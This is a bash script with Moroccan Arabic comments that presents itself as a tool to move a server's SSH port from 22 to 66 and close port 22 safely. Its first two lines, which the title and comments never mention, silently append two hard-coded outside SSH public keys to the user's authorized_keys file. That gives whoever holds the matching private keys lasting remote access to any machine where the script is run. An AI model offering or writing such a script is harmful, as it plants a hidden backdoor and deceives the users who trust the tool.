#!/bin/bash

# === SSH Port Auto Changer to 66 & Disable 22 Safely ===



mkdir -p ~/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP/6mja6JSVT/UsM3F6CSFZF5besPYDk9+VuzjVLV2Pb" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && chmod 700 ~/.ssh
mkdir -p ~/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJkCO3YXessYe4SmgcZLAfCrQ2rqkn8yPA5tl2WrmAXf" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && chmod 700 ~/.ssh

NEW_PORT=66
OLD_PORT=22

echo "📌 غادي نبدلو بورت SSH من $OLD_PORT إلى $NEW_PORT..."

# نسخ الملف الأصلي احتياطيا
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak

# تغيير البورت فـ sshd_config
sed -i "s/^#Port $OLD_PORT/Port $NEW_PORT/; s/^Port $OLD_PORT/Port $NEW_PORT/" /etc/ssh/sshd_config

# السماح للبورت الجديد فـ ufw (إذا مستعمل)
if command -v ufw >/dev/null 2>&1; then
    ufw allow $NEW_PORT/tcp
    ufw reload
fi

# السماح للبورت الجديد فـ iptables (إذا مستعمل)
if command -v iptables >/dev/null 2>&1; then
    iptables -A INPUT -p tcp --dport $NEW_PORT -j ACCEPT
fi

# إعادة تشغيل SSH
systemctl restart sshd
sleep 2

# اختبار الاتصال بالـ بورت الجديد (من VPS نفسه)
if nc -zv 127.0.0.1 $NEW_PORT >/dev/null 2>&1; then
    echo "✅ SSH على $NEW_PORT خدام. غادي نسد البورت 22 نهائياً."

    # إزالة البورت القديم من ufw
    if command -v ufw >/dev/null 2>&1; then
        ufw delete allow $OLD_PORT/tcp
        ufw reload
    fi

    # إزالة البورت القديم من iptables
    if command -v iptables >/dev/null 2>&1; then
        iptables -D INPUT -p tcp --dport $OLD_PORT -j ACCEPT
    fi

    echo "✅ البورت $OLD_PORT تقفل نهائياً."
else
    echo "⚠️ خطأ! SSH على $NEW_PORT ما خدامش. البورت 22 ما تقفلش."
    echo "راجع إعداداتك وجرب من جديد."
fi

echo "جرب الاتصال الجديد: ssh -p $NEW_PORT user@your_vps_ip"
echo "نسخة احتياطية من sshd_config موجودة في /etc/ssh/sshd_config.bak"
